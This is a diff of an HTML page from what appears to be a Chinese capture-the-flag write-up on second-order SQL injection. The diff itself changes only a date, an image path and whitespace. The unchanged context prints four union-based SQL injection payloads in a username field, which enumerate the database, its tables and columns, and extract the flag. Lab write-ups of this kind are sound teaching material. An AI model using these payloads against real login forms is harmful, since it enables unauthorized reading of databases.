@@ -576,7 +576,7 @@ username &amp;#">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-30
+                    2022-01-28
                 </div>
                 
 
@@ -609,14 +609,14 @@ username &amp;#">
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[二次注入]</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-October-2019-Twice-SQL-Injection/image-20210830185028272.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-October-2019-Twice-SQL-Injection/image-20210830185028272.png"></p>
 <h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>还在change那里试了半天，没想到注入点竟然在登录。应该多试试的唉。</p>
 <p>payload：</p>
 <pre class="line-numbers language-none"><code class="language-none">username &#x3D;1&#39; union select database() #
 username &#x3D;1&#39; union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctftraining&#39; #
- 
+
 username &#x3D;1&#39; union select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;#
- 
+
 username &#x3D;1&#39; union select flag from flag #<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>数据库</p>
